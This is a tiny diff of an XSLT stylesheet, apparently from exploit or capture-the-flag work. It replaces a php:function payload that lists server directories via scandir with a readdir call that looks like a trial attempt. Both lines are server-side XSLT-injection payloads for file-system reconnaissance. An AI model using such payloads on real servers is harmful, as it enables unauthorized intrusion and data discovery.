@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
- <xsl:value-of select="php:function('print_r','scandir(`./`)')"/>
+ <xsl:value-of select="php:function('readdir','Resource id 6#')"/>
 
 </xsl:template>
 </xsl:stylesheet>
